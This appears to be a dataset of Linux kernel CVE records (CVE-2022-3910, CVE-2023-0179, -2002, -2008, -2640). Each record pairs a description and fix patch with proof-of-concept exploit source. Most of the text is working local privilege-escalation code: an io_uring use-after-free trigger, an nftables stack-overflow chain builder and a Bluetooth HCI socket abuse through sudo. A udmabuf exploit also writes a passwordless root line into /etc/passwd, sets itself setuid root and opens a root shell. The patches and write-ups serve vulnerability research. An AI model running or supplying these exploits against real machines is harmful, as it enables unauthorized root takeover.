    if (chdir(TEMP_WORKDIR)) {
        die(""chdir: %m"");
    }
    free(cmdline);
}

int trigger_fd_uaf(int fd) {
#ifndef REQ_F_FIXED_FILE
#define REQ_F_FIXED_FILE 1
#endif
    struct io_uring ring;
    struct io_uring_sqe *sqe;

    io_uring_queue_init(64, &ring, 0);
    io_uring_register_files(&ring, &fd, 1);

    for (int i = 0; i < 2; i++) {
        sqe = io_uring_get_sqe(&ring);
        sqe->opcode = IORING_OP_MSG_RING;
        sqe->flags = REQ_F_FIXED_FILE;
        sqe->fd = 0;
        io_uring_submit(&ring);
    }

    // init_task_work(&file->f_u.fu_rcuhead, ____fput);
    logd(""wait task ____fput() to free the struct file ..."");
    usleep(500 * 1000);

    return 0;
}

int main(void) {
    prepare_workdir();

    int vuln_fd = open(TEMP_VICTIM_FILE, O_WRONLY);
    logd(""vuln_fd: %d"", vuln_fd);
    if (vuln_fd < 0) {
        die(""open: %m"");
    }

    trigger_fd_uaf(vuln_fd);

    logw(""refcount=0, CRASH"");
    write(vuln_fd, ""AAAA"", 4);
    loge(""not crash ?"");

    return 0;
}

",https://github.com/veritas501/CVE-2022-3910/tree/master,,,存在多种PoC
CVE-2023-0179,https://www.opencve.io/cve/CVE-2023-0179,"A buffer overflow vulnerability was found in the Netfilter subsystem in the Linux Kernel. This issue could allow the leakage of both stack and heap addresses, and potentially allow Local Privilege Escalation to the root user via arbitrary code execution.","Since the vulnerable operation in nft_payload_copy_vlan should account for
the encapsulated VLAN tag, I suspect that the last plus sign should have
been a minus since it prevents any wrapping.
I, therefore, proposed the following patch, which has been applied in
commit 696e1a48b1a1:

```diff
static bool
nft_payload_copy_vlan(u32 *d, const struct sk_buff *skb, u8 offset, u8 len)
{
    ...
    if (offset + len > VLAN_ETH_HLEN + vlan_hlen)
-        ethlen -= offset + len - VLAN_ETH_HLEN + vlan_hlen;
+        ethlen -= offset + len - VLAN_ETH_HLEN - vlan_hlen;
    ...
}
```",https://seclists.org/oss-sec/2023/q1/20,"#define VLAN_HLEN    4
#define VLAN_ETH_HLEN 18

int create_final_chain_rule(struct mnl_socket* nl, char* table_name, char*
chain_name, uint16_t family, uint64_t* handle, int* seq, uint8_t offset,
uint8_t len) {
    struct nftnl_rule* r = build_rule(table_name, chain_name, family,
handle);
    // 1. register grooming
    char *data[] =  {""ABBB"", ""BBBB"", ""BCCC"", ""CCCC"", ""CAAA"", ""AAAA"",
""AAAA"", ""AAAA"", ""AAAA"", ""AAAA"", ""AAAA"", ""AAAA"", ""AAAA"", ""AAAA"",""AAAA"",
""AAAA"", ""AAAA""};

    for (int reg = NFT_REG32_00; reg <= NFT_REG32_15; reg++) {
        rule_add_immediate_data(r, reg, (void *) data[reg - NFT_REG32_00],
4);
    }

    // 2. trigger overflow
    rule_add_payload(r, NFT_PAYLOAD_LL_HEADER, offset, len, NFT_REG32_15);

    // 3. break from the regs verdict switch, going back to the corrupted
previous chain
    rule_add_immediate_verdict(r, NFT_CONTINUE, ""final_chain"");

    return send_batch_request(
        nl,
        NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),
        NLM_F_CREATE, family, (void**)&r, seq,
        NULL
    );
}

int create_jmp_chain_rule(struct mnl_socket* nl, char* table_name, char*
chain_name, uint16_t family, uint64_t* handle, int* seq)
{
    struct nftnl_rule* r = build_rule(table_name, chain_name, family,
handle);
    int i = atoi(chain_name);
    i++;
    char next_chain[5];
    sprintf(next_chain, ""%d"", i);

    if (i == 8) {
        // jump to the overflow chain
        rule_add_immediate_verdict(r, NFT_JUMP, ""final_chain"");
    } else {
        // jump to the next jmp chain, incrementing stackptr
        rule_add_immediate_verdict(r, NFT_JUMP, next_chain);
    }

    return send_batch_request(
        nl,
        NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),
        NLM_F_CREATE, family, (void**)&r, seq,
        NULL
    );
}

int create_base_chain_rule(struct mnl_socket* nl, char* table_name, char*
chain_name, uint16_t family, uint64_t* handle, int* seq)
{
    struct nftnl_rule* r = build_rule(table_name, chain_name, family,
handle);
    uint16_t num = htons(1337);
    uint16_t biggerNum = htons(1338);
    rule_add_immediate_data(r, NFT_REG32_15, &num, sizeof num);

    rule_add_cmp(r, NFT_CMP_NEQ, NFT_REG32_15, &biggerNum, sizeof
biggerNum);

    rule_add_immediate_verdict(r, NFT_JUMP, ""0"");

    return send_batch_request(
        nl,
        NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),
        NLM_F_CREATE, family, (void**)&r, seq,
        NULL
    );
}

int main(int argc, char** argv, char** envp)
{
    system(""ip link set dev lo up"");

    struct mnl_socket* nl = mnl_socket_open(NETLINK_NETFILTER);

    if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
        perror(""[-] mnl_socket_bind"");
        exit(EXIT_FAILURE);
    }
    int seq = time(NULL);
    int err;

    char *table_name = ""exploit_table"",
         *base_chain_name = ""base_chain"",
         *final_chain_name = ""final_chain"";

    if (create_table(nl, table_name, AF_INET, &seq, NULL) == -1) {
        perror(""Failed creating table"");
        exit(EXIT_FAILURE);
    }
    printf(""[+] Created nft %s\n"", table_name);

    struct unft_base_chain_param bp;
    bp.hook_num = NF_INET_PRE_ROUTING;
    bp.prio = 10;
    if (create_chain(nl, table_name, base_chain_name, NFPROTO_IPV4, &bp,
&seq, NULL)) {
        perror(""Failed creating base chain"");
        exit(EXIT_FAILURE);
    }
    printf(""[+] Created base ipv4 chain %s\n"", base_chain_name);

    if (create_chain(nl, table_name, final_chain_name, NFPROTO_IPV4, NULL,
&seq, NULL)) {
        perror(""Failed creating final chain"");
        exit(EXIT_FAILURE);
    }
    printf(""[+] Created final chain %s\n"", final_chain_name);

    char jmp_chain_name[5];
    for (int i = 0; i < 8; i++) {
        sprintf(jmp_chain_name, ""%d"", i);
        if (create_chain(nl, table_name, jmp_chain_name, NFPROTO_IPV4,
NULL, &seq, NULL)) {
            perror(""Failed creating jmp chain"");
            exit(EXIT_FAILURE);
        }
        printf(""[+] Created jmp chain %s\n"", jmp_chain_name);
    }

    if (create_base_chain_rule(nl, table_name, base_chain_name,
NFPROTO_IPV4, NULL, &seq)) {
        perror(""Failed creating base chain rule"");
        exit(EXIT_FAILURE);
    }

    puts(""[+] Succesfully created base_chain rule!"");
    for (int i = 0; i < 8; i++) {
        sprintf(jmp_chain_name, ""%d"", i);
        if (create_jmp_chain_rule(nl, table_name, jmp_chain_name,
NFPROTO_IPV4, NULL, &seq)) {
            perror(""Failed creating jmp chain rule"");
            exit(EXIT_FAILURE);
        }
        puts(""[+] Successfully created jmp chain rule!"");
    }

    uint8_t vlan_hlen = 0, ethlen;
    for (uint8_t len = 0; len < UINT8_MAX; len++) {
        for (uint8_t offset = 0; offset < UINT8_MAX; offset++) {
            if (offset >= VLAN_ETH_HLEN && offset < VLAN_ETH_HLEN +
VLAN_HLEN) {
                vlan_hlen = 4;
            } else {
                vlan_hlen = 0;
            }
            if (offset < VLAN_ETH_HLEN + vlan_hlen) {
                uint8_t ethlen = len;
                if (offset + len > VLAN_ETH_HLEN + vlan_hlen) {

                    ethlen -= offset + len - VLAN_ETH_HLEN + vlan_hlen;
                    if (ethlen > 250 && vlan_hlen == 4 && len % 4 == 0) {
                        if (create_final_chain_rule(nl, table_name,
final_chain_name, NFPROTO_IPV4, NULL, &seq, offset, len)) {
                            perror(""Failed creating base chain rule"");
                            //exit(EXIT_FAILURE);
                        } else {
                            printf(""offset: %hhu & len: %hhu & ethlen =
%hhu\n"", offset, len, ethlen);
                            puts(""[+] Successfully created final chain
rule!"");
                            return 0;
                        }
                    }
                }
            }
        }
    }
}",https://seclists.org/oss-sec/2023/q1/20,"The vulnerability consists of a stack buffer overflow due to an integer
underflow vulnerability inside the nft_payload_copy_vlan function, which is
invoked with nft_payload expressions as long as a VLAN tag is present in
the current skb.
(net/netfilter/nft_payload.c)

```c
/* add vlan header into the user buffer for if tag was removed by offloads
*/
static bool nft_payload_copy_vlan(u32 *d, const struct sk_buff *skb, u8
offset, u8 len)
{
    int mac_off = skb_mac_header(skb) - skb->data;
    u8 *vlanh, *dst_u8 = (u8 *) d;
    struct vlan_ethhdr veth;
    u8 vlan_hlen = 0;

    if ((skb->protocol == htons(ETH_P_8021AD) ||       <===== (0)
         skb->protocol == htons(ETH_P_8021Q)) &&
        offset >= VLAN_ETH_HLEN && offset < VLAN_ETH_HLEN + VLAN_HLEN)
        vlan_hlen += VLAN_HLEN;

    vlanh = (u8 *) &veth;

    if (offset < VLAN_ETH_HLEN + vlan_hlen) {
        u8 ethlen = len;

        if (vlan_hlen &&
            skb_copy_bits(skb, mac_off, &veth, VLAN_ETH_HLEN) < 0)
            return false;
        else if (!nft_payload_rebuild_vlan_hdr(skb, mac_off, &veth))
            return false;

        if (offset + len > VLAN_ETH_HLEN + vlan_hlen) <===== (1)
            ethlen -= offset + len - VLAN_ETH_HLEN + vlan_hlen;   <===== (2)

        memcpy(dst_u8, vlanh + offset - vlan_hlen, ethlen);     <===== (3)

        len -= ethlen;
        if (len == 0)
            return true;

        dst_u8 += ethlen;
        offset = ETH_HLEN + vlan_hlen;
    } else {
        offset -= VLAN_HLEN + vlan_hlen;
    }

    return skb_copy_bits(skb, offset + mac_off, dst_u8, len) == 0;
}
```

The checks at (0) look for a second VLAN tag from the EtherType field and,
if the offset falls between the first VLAN_ETH_HLEN bytes and VLAN_ETH_HLEN
plus the size of another VLAN header, then nftables should also try and
process the second VLAN.
At (1) the if statement correctly checks the boundary of the header using
the offset and len variables (8-bit unsigned ints), evaluating to true
whenever offset + len exceeds the double-tagged VLAN header.
The use of inline statements successfully prevents wrappings because u8
types are automatically promoted before the comparison.

However, on the next line, the subtraction at (2) does not grant type
promotion, and ethlen (u8) may wrap to UINT8_MAX under certain conditions.
Some examples of vulnerable offset and len pairs are:

offset: 19 & len: 4 & ethlen = 251
offset: 16 & len: 19 & ethlen = 254
offset: 20 & len: 32 & ethlen = 250
...
Other pairs can be listed with the following algorithm:
```c
uint8_t vlan_hlen = VLAN_HLEN, ethlen;
for (uint8_t len = 0; len < UINT8_MAX; len++) {
    for (uint8_t offset = 0; offset < UINT8_MAX; offset++) {
        if (offset < VLAN_ETH_HLEN + vlan_hlen) {
            uint8_t ethlen = len;
            if (offset + len > VLAN_ETH_HLEN + vlan_hlen) {
                ethlen -= offset + len - VLAN_ETH_HLEN + vlan_hlen;
                printf(""offset: %hhu & len: %hhu & ethlen = %hhu\n"",
offset, len, ethlen);
            }
        }
    }
}
```",https://www.openwall.com/lists/oss-security/2023/01/13/2,
CVE-2023-2002,https://www.opencve.io/cve/CVE-2023-2002,"A vulnerability was found in the HCI sockets implementation due to a missing capability check in net/bluetooth/hci_sock.c in the Linux Kernel. This flaw allows an attacker to unauthorized execution of management commands, compromising the confidentiality, integrity, and availability of Bluetooth communication.","Previously, capability was checked using capable(), which verified that the
caller of the ioctl system call had the required capability. In addition,
the result of the check would be stored in the HCI_SOCK_TRUSTED flag,
making it persistent for the socket.

However, malicious programs can abuse this approach by deliberately sharing
an HCI socket with a privileged task. The HCI socket will be marked as
trusted when the privileged task occasionally makes an ioctl call.

This problem can be solved by using sk_capable() to check capability, which
ensures that not only the current task but also the socket opener has the
specified capability, thus reducing the risk of privilege escalation
through the previously identified vulnerability.

Cc: stable@vger.kernel.org
Fixes: f81f5b2db869 (""Bluetooth: Send control open and close messages for HCI raw sockets"")
Signed-off-by: Ruihan Li <lrh2000@pku.edu.cn>
---
 net/bluetooth/hci_sock.c | 9 ++++++++-
 1 file changed, 8 insertions(+), 1 deletion(-)

diff --git a/net/bluetooth/hci_sock.c b/net/bluetooth/hci_sock.c
index 065812232..f597fe0db 100644
--- a/net/bluetooth/hci_sock.c
+++ b/net/bluetooth/hci_sock.c
@@ -1003,7 +1003,14 @@ static int hci_sock_ioctl(struct socket *sock, unsigned int cmd,
 	if (hci_sock_gen_cookie(sk)) {
 		struct sk_buff *skb;
 
-		if (capable(CAP_NET_ADMIN))
+		/* Perform careful checks before setting the HCI_SOCK_TRUSTED
+		 * flag. Make sure that not only the current task but also
+		 * the socket opener has the required capability, since
+		 * privileged programs can be tricked into making ioctl calls
+		 * on HCI sockets, and the socket should not be marked as
+		 * trusted simply because the ioctl caller is privileged.
+		 */
+		if (sk_capable(sk, CAP_NET_ADMIN))
 			hci_sock_set_flag(sk, HCI_SOCK_TRUSTED);
 
 		/* Send event to monitor */
-- 
2.40.0",https://lore.kernel.org/linux-bluetooth/20230416081404.8227-1-lrh2000@pku.edu.cn/,"// SPDX-License-Identifier: GPL-2.0-or-later
/*
 * CVE-2023-2002 PoC exploit.
 * See https://github.com/lrh2000/CVE-2023-2002 for details.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include ""bluetooth.h""

static int gain_privileges(void)
{
	int fd = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI);

	int pid = fork();
	if (pid == 0) {
		dup2(fd, 2);
		close(fd);

		execlp(""sudo"", ""sudo"", NULL);
		exit(EXIT_FAILURE);
	}

	if (waitpid(pid, NULL, 0) < 0) {
		perror(""waitpid"");
		exit(EXIT_FAILURE);
	}

	return fd;
}

static void bind_control_channel(int fd)
{
	struct sockaddr_hci haddr;

	haddr.hci_family = AF_BLUETOOTH;
	haddr.hci_dev = HCI_DEV_NONE;
	haddr.hci_channel = HCI_CHANNEL_CONTROL;

	if (bind(fd, (struct sockaddr *)&haddr, sizeof(haddr)) < 0) {
		perror(""bind"");
		exit(EXIT_FAILURE);
	}
}

static void send_set_power(int fd, int index, int status)
{
	__u8 buffer[sizeof(struct mgmt_hdr) + sizeof(struct mgmt_mode)];
	struct mgmt_hdr *hdr = (struct mgmt_hdr *)buffer;
	struct mgmt_mode *cp = (struct mgmt_mode *)(hdr + 1);

	hdr->opcode = MGMT_OP_SET_POWERED;
	hdr->index = index;
	hdr->len = sizeof(*cp);
	cp->val = status;

	if (send(fd, buffer, sizeof(buffer), 0) < 0) {
		perror(""send"");
		exit(EXIT_FAILURE);
	}
}

static void check_cmd_result(int fd)
{
	__u8 buffer[sizeof(struct mgmt_hdr) + sizeof(struct mgmt_ev_cmd_status)];
	struct mgmt_hdr *hdr = (struct mgmt_hdr *)buffer;
	struct mgmt_ev_cmd_status *ev = (struct mgmt_ev_cmd_status *)(hdr + 1);
	ssize_t recved;

	recved = recv(fd, buffer, sizeof(buffer), 0);
	if (recved < 0) {
		perror(""recv"");
		exit(EXIT_FAILURE);
	}
	if (recved == 0) {
		fputs(""recv: EOF\n"", stderr);
		exit(EXIT_FAILURE);
	}
	if (recved < (ssize_t)sizeof(buffer)) {
		fputs(""recv: Incomplete\n"", stderr);
		exit(EXIT_FAILURE);
	}

	if (hdr->opcode != MGMT_EV_CMD_COMPLETE &&
	    hdr->opcode != MGMT_EV_CMD_STATUS) {
		fprintf(stderr, ""unrecognized opcode: %d\n"", (int)hdr->opcode);
		exit(EXIT_FAILURE);
	}
	if (hdr->len < (ssize_t)sizeof(*ev)) {
		fprintf(stderr, ""invalid length: %d\n"", (int)hdr->len);
		exit(EXIT_FAILURE);
	}

	if (ev->status == MGMT_STATUS_SUCCESS) {
		puts(""Success!"");
	} else {
		fprintf(stderr, ""Failed. Reason: %s\n"",
			stringify_mgmt_status(ev->status));
		exit(EXIT_FAILURE);
	}
}

static _Noreturn void usage(char *prog)
{
	fprintf(stderr, ""Usage: %s POWER_STATUS DEVICE_INDEX\n"", prog);
	fputs(""\tPOWER_STATUS := { up | down }\n"", stderr);
	fputs(""\tDEVICE_INDEX := { 0 | 1 | ... } \n"", stderr);

	exit(EXIT_FAILURE);
}

static int parse_int(const char *str, int *res)
{
	char *end;

	*res = strtol(str, &end, 10);
	if (end == str || *end != '\0') {
		return -1;
	}

	return 0;
}

int main(int argc, char **argv)
{
	int power_status;
	int device_index;
	int fd;

	if (argc != 3)
		usage(argv[0]);

	if (strcmp(argv[1], ""up"") == 0) {
		power_status = 1;
	} else if (strcmp(argv[1], ""down"") == 0) {
		power_status = 0;
	} else {
		fprintf(stderr, ""invalid power status: %s\n\n"", argv[1]);
		usage(argv[0]);
	}

	if (parse_int(argv[2], &device_index) != 0) {
		fprintf(stderr, ""invalid device index: %s\n\n"", argv[2]);
		usage(argv[0]);
	}

	fd = gain_privileges();

	bind_control_channel(fd);

	send_set_power(fd, device_index, power_status);

	check_cmd_result(fd);

	close(fd);

	return 0;
}

",https://github.com/lrh2000/CVE-2023-2002/tree/master/exp,"An insufficient permission check has been found in the Bluetooth subsystem of
the Linux kernel when handling ioctl system calls of HCI sockets. This causes
tasks without the proper CAP_NET_ADMIN capability can easily mark HCI sockets
as _trusted_. Trusted sockets are intended to enable the sending and receiving
of management commands and events, such as pairing or connecting with a new
device.  As a result, unprivileged users can acquire a trusted socket, leading
to unauthorized execution of management commands. The exploit requires only
the presence of a set of commonly used setuid programs (e.g., su, sudo).

## Cause

The direct cause of the vulnerability is the following code snippet:
```c
static int hci_sock_ioctl(struct socket *sock, unsigned int cmd,
                          unsigned long arg)
{
	...
        if (hci_sock_gen_cookie(sk)) {
		...
                if (capable(CAP_NET_ADMIN))
                        hci_sock_set_flag(sk, HCI_SOCK_TRUSTED);
		...
        }
	...
}
```

The implementation of an ioctl system call verifies whether the task invoking
the call has the necessary CAP_NET_ADMIN capability to update the
HCI_SOCK_TRUSTED flag. However, this check only considers the calling task,
which may not necessarily be the socket opener. For instance, the socket can
be shared with another task using fork and execve, where the latter task may
be privileged, such as a setuid program. Moreover, if the socket is used as
stdout or stderr, an ioctl call is made to obtain tty parameters, which can be
verified through the strace command.",https://www.openwall.com/lists/oss-security/2023/04/16/3,
CVE-2023-2008,https://www.opencve.io/cve/CVE-2023-2008,"A flaw was found in the Linux kernel's udmabuf device driver. The specific flaw exists within a fault handler. The issue results from the lack of proper validation of user-supplied data, which can result in a memory access past the end of an array. An attacker can leverage this vulnerability to escalate privileges and execute arbitrary code in the context of the kernel.","
udmabuf: add back sanity check
Check vm_fault->pgoff before using it.  When we removed the warning, we
also removed the check.
@@ -32,8 +32,11 @@ static vm_fault_t udmabuf_vm_fault(struct vm_fault *vmf)
{
	struct vm_area_struct *vma = vmf->vma;
	struct udmabuf *ubuf = vma->vm_private_data;
	pgoff_t pgoff = vmf->pgoff;

-	vmf->page = ubuf->pages[vmf->pgoff];
+	if (pgoff >= ubuf->pagecount)
+		return VM_FAULT_SIGBUS;
+	vmf->page = ubuf->pages[pgoff];
	get_page(vmf->page);
	return 0;
}
",https://github.com/torvalds/linux/commit/05b252cccb2e5c3f56119d25de684b4f810ba4,"#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#include <sys/mman.h>

#include <err.h>

#include <unistd.h>
#include <fcntl.h>

#include <sys/ioctl.h>

#include <sys/uio.h>

#include <string.h>

#include <sys/types.h>
#include <sys/wait.h>

#define PAGE_SIZE 4096

#define N_PAGES_ALLOC 128

#define N_PIPES_SPRAY 256

struct udmabuf_create
{
  uint32_t memfd;
  uint32_t flags;
  uint64_t offset;
  uint64_t size;
};

#define UDMABUF_CREATE _IOW('u', 0x42, struct udmabuf_create)

int main(int argc, char* argv[argc+1])
{
  if (geteuid() == 0)
  {
    printf(""[+] backdoor triggered successfully!\n"");
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    system(""/bin/sh"");
    exit(EXIT_SUCCESS);
  }

  int mem_fd = memfd_create(""test"", MFD_ALLOW_SEALING);
  if (mem_fd < 0)
    errx(1, ""couldn't create anonymous file"");
  
  /* setup size of anonymous file, the initial size was 0 */
  if (ftruncate(mem_fd, PAGE_SIZE * N_PAGES_ALLOC) < 0)
    errx(1, ""couldn't truncate file length"");

  /* make sure the file cannot be reduced in size */
  if (fcntl(mem_fd, F_ADD_SEALS, F_SEAL_SHRINK) < 0)
    errx(1, ""couldn't seal file"");

  printf(""[*] anon file fd=%d (%#x bytes)\n"", mem_fd, PAGE_SIZE * N_PAGES_ALLOC);

  int target_fd = open(""/etc/passwd"", O_RDONLY);
  if (target_fd < 0)
    errx(1, ""couldn't open target file"");

  /* create a read-only shared mapping avoiding CoW */
  void* target_map = mmap(NULL, PAGE_SIZE, PROT_READ, MAP_SHARED, target_fd, 0);
  if (target_map == MAP_FAILED)
    errx(1, ""couldn't map target file"");

  printf(""[*] target file mapped at %p (%#x bytes)\n"", target_map, PAGE_SIZE);

  int dev_fd = open(""/dev/udmabuf"", O_RDWR);
  if (dev_fd < 0)
    errx(1, ""couldn't open device"");

  printf(""[*] udmabuf device fd=%d\n"", dev_fd);

  size_t attempt = 0;

  int end = 0;
  while (! end)
  {
    printf(""[!] attempt %zu\n"", attempt++);

    /* spray pipes, by default the pipe buffers array land on kmalloc-1024 */
    int pipe_fds[N_PIPES_SPRAY][2] = { 0 };
    for (int i=0; i < N_PIPES_SPRAY; i++)
    {
      if (pipe(pipe_fds[i]) < 0)
        errx(1, ""couldn't create pipe"");
    }

    printf(""[*] sprayed %d pipes\n"", N_PIPES_SPRAY);

    /* shrink some pipes making holes in kmalloc-1024 */
    for (int i=0; i < N_PIPES_SPRAY; i++)
    {
      if (i % 2 == 0)
      {
        if (fcntl(pipe_fds[i][0], F_SETPIPE_SZ, PAGE_SIZE) < 0)
          errx(1, ""couldn't shrink pipe"");
      } 
    }

    struct udmabuf_create create = { 0 };
    create.memfd = mem_fd;
    create.size  = PAGE_SIZE * N_PAGES_ALLOC;
   
    /* reallocate one of the freed holes in kmalloc-1024 */
    int udmabuf_fd = ioctl(dev_fd, UDMABUF_CREATE, &create);
    if (udmabuf_fd < 0)
      errx(1, ""couldn't create udmabuf"");

    printf(""[*] udmabuf fd=%d\n"", udmabuf_fd);

    /* vmsplice to all pipes, should grab a page reference and
     * put the page pointer inside the pipe buf. hopefully one
     * of this is just after our pages array */
    for (int i=0; i < N_PIPES_SPRAY; i++)
    {
      struct iovec iov = {
        .iov_base = target_map,
        .iov_len  = PAGE_SIZE,
      };

      if (vmsplice(pipe_fds[i][1], &iov, 1, 0) < 0)
        errx(1, ""couldn't splice target page into pipes"");
    }

    /* map the udmabuf into userspace */
    void* udmabuf_map = mmap(NULL, PAGE_SIZE * N_PAGES_ALLOC,
        PROT_READ|PROT_WRITE, MAP_SHARED, udmabuf_fd, 0);
    if (udmabuf_map == MAP_FAILED)
      errx(1, ""couldn't map udmabuf"");

    printf(""[*] udmabuf mapped at %p (%#x bytes)\n"", 
        udmabuf_map, PAGE_SIZE * N_PAGES_ALLOC);

    /* remap the virtual mapping expanding its size */
    void* new_udmabuf_map = mremap(udmabuf_map,
        PAGE_SIZE * N_PAGES_ALLOC, PAGE_SIZE * N_PAGES_ALLOC * 2, MREMAP_MAYMOVE);
    if (new_udmabuf_map == MAP_FAILED)
      errx(1, ""couldn't remap udmabuf mapping"");

    printf(""[*] udmabuf map expanded at %p (%#x bytes)\n"", new_udmabuf_map,
        PAGE_SIZE * N_PAGES_ALLOC * 2);

    /* we should be out-of-bounds of the pages array */
    char* ptr = new_udmabuf_map + PAGE_SIZE * N_PAGES_ALLOC;

    pid_t pid = fork();
    if (pid < 0)
      errx(1, ""couldn't fork"");

    if (! pid)
    {
      /* check if the oob succeded */
      if (! memcmp(ptr, ""root"", 4))
        exit(EXIT_SUCCESS);
      exit(EXIT_FAILURE);
    }

    int wstatus = -1;
    if (waitpid(pid, &wstatus, 0) < 0)
      errx(1, ""couldn't wait for child"");

    if ((end = ! wstatus))
    {
      printf(""[+] heap spraying succeded\n"");

      char backdoor[] = ""root::0:0:xroot:/root:/bin/bash"";
      char backup[sizeof(backdoor)] = { 0 };

      memcpy(backup, ptr, sizeof(backup));
      memcpy(ptr, backdoor, sizeof(backdoor));

      printf(""[*] backdoor installed\n"");

      char cmd[512];
      sprintf(cmd, ""su -c \""chown root:root %s && chmod u+s %s\"""", 
          argv[0], argv[0]);
      printf(""[*] payload=%s\n"", cmd);
      system(cmd);

      memcpy(ptr, backup, sizeof(backup));
      printf(""[*] backup restored\n"");     
    }
    else
    {
      printf(""[-] heap spraying failed\n"");

      /* roll back, we need to spray again */
      munmap(new_udmabuf_map, PAGE_SIZE * N_PAGES_ALLOC * 2);

      close(udmabuf_fd);

      for (int i=0; i < N_PIPES_SPRAY; i++)
      {
        close(pipe_fds[i][0]);
        close(pipe_fds[i][1]);
      }
    }
  }

  system(argv[0]);

  return EXIT_SUCCESS;
}

",https://github.com/bluefrostsecurity/CVE-2023-2008/tree/main,,,
CVE-2023-2640,https://www.opencve.io/cve/CVE-2023-2640,"On Ubuntu kernels carrying both c914c0e27eb0 and ""UBUNTU: SAUCE: overlayfs: Skip permission checking for trusted.overlayfs.* xattrs"", an unprivileged user may set privileged extended attributes on the mounted files, leading them to be set on the upper files without the appropriate security checks.","Commit ""UBUNTU: SAUCE: overlayfs: Skip permission checking for
trusted.overlayfs.* xattrs"" replaced the VFS calls to change xattrs to
their _noperm equivalents.

However, since upstream commit c914c0e27eb0 (""ovl: use wrappers to all
vfs_*xattr() calls""), overlayfs started using the changed wrapper function
to set any extended attributes.

This means that overlayfs skips checking permissions for any extended
attribute changes, not only trusted.overlayfs.* xattrs, as was intended by
the sauce commit above.

Fixes: c914c0e27eb0 (""ovl: use wrappers to all vfs_*xattr() calls"")
CVE-2023-2640
CVE-2023-32629
Signed-off-by: Thadeu Lima de Souza Cascardo <cascardo at canonical.com>
---
 fs/overlayfs/overlayfs.h | 16 +++-------------
 fs/xattr.c               | 36 ++++++------------------------------
 include/linux/xattr.h    |  1 -
 3 files changed, 9 insertions(+), 44 deletions(-)

diff --git a/fs/overlayfs/overlayfs.h b/fs/overlayfs/overlayfs.h
index e523d600da4e..1df7f850ff3b 100644
--- a/fs/overlayfs/overlayfs.h
+++ b/fs/overlayfs/overlayfs.h
@@ -251,12 +251,8 @@ static inline int ovl_do_setxattr(struct ovl_fs *ofs, struct dentry *dentry,
 				  const char *name, const void *value,
 				  size_t size, int flags)
 {
-	struct inode *inode = dentry->d_inode;
-	int err;
-
-	inode_lock(inode);
-	err = __vfs_setxattr_noperm(&init_user_ns, dentry, name, value, size, flags);
-	inode_unlock(inode);
+	int err = vfs_setxattr(ovl_upper_mnt_userns(ofs), dentry, name,
+			       value, size, flags);
 
 	pr_debug(""setxattr(%pd2, \""%s\"", \""%*pE\"", %zu, %d) = %i\n"",
 		 dentry, name, min((int)size, 48), value, size, flags, err);
@@ -273,13 +269,7 @@ static inline int ovl_setxattr(struct ovl_fs *ofs, struct dentry *dentry,
 static inline int ovl_do_removexattr(struct ovl_fs *ofs, struct dentry *dentry,
 				     const char *name)
 {
-	struct inode *inode = dentry->d_inode;
-	int err;
-
-	inode_lock(inode);
-	err = __vfs_removexattr_noperm(&init_user_ns, dentry, name);
-	inode_unlock(inode);
-
+	int err = vfs_removexattr(ovl_upper_mnt_userns(ofs), dentry, name);
 	pr_debug(""removexattr(%pd2, \""%s\"") = %i\n"", dentry, name, err);
 	return err;
 }
diff --git a/fs/xattr.c b/fs/xattr.c
index 76dc91ec7ae8..adab9a70b536 100644
--- a/fs/xattr.c
+++ b/fs/xattr.c
@@ -259,7 +259,6 @@ int __vfs_setxattr_noperm(struct user_namespace *mnt_userns,
 
 	return error;
 }
-EXPORT_SYMBOL_GPL(__vfs_setxattr_noperm);
 
 /**
  * __vfs_setxattr_locked - set an extended attribute while holding the inode
@@ -500,34 +499,6 @@ __vfs_removexattr(struct user_namespace *mnt_userns, struct dentry *dentry,
 }
 EXPORT_SYMBOL(__vfs_removexattr);
 
-/**
- *  __vfs_removexattr_noperm - perform removexattr operation without
- *  performing permission checks.
- *
- *  @dentry - object to perform setxattr on
- *  @name - xattr name to set
- *
- *  returns the result of the internal setxattr or setsecurity operations.
- *
- *  This function requires the caller to lock the inode's i_mutex before it
- *  is executed. It also assumes that the caller will make the appropriate
- *  permission checks.
- */
-int
-__vfs_removexattr_noperm(struct user_namespace *mnt_userns,
-			 struct dentry *dentry, const char *name)
-{
-	int error;
-
-	error =__vfs_removexattr(mnt_userns, dentry, name);
-	if (!error) {
-		fsnotify_xattr(dentry);
-		evm_inode_post_removexattr(dentry, name);
-	}
-	return error;
-}
-EXPORT_SYMBOL_GPL(__vfs_removexattr_noperm);
-
 /**
  * __vfs_removexattr_locked - set an extended attribute while holding the inode
  * lock
@@ -558,7 +529,12 @@ __vfs_removexattr_locked(struct user_namespace *mnt_userns,
 	if (error)
 		goto out;
 
-	error = __vfs_removexattr_noperm(mnt_userns, dentry, name);
+	error = __vfs_removexattr(mnt_userns, dentry, name);
+
+	if (!error) {
+		fsnotify_xattr(dentry);
+		evm_inode_post_removexattr(dentry, name);
+	}
 
 out:
 	return error;
diff --git a/include/linux/xattr.h b/include/linux/xattr.h
index 149b148625da..2e7dd44926e4 100644
--- a/include/linux/xattr.h
+++ b/include/linux/xattr.h
@@ -69,7 +69,6 @@ int __vfs_setxattr_locked(struct user_namespace *, struct dentry *,
 int vfs_setxattr(struct user_namespace *, struct dentry *, const char *,
 		 const void *, size_t, int);
 int __vfs_removexattr(struct user_namespace *, struct dentry *, const char *);
-int __vfs_removexattr_noperm(struct user_namespace *, struct dentry *, const char *);
 int __vfs_removexattr_locked(struct user_namespace *, struct dentry *,
 			     const char *, struct inode **);
 int vfs_removexattr(struct user_namespace *, struct dentry *, const char *);
-- 
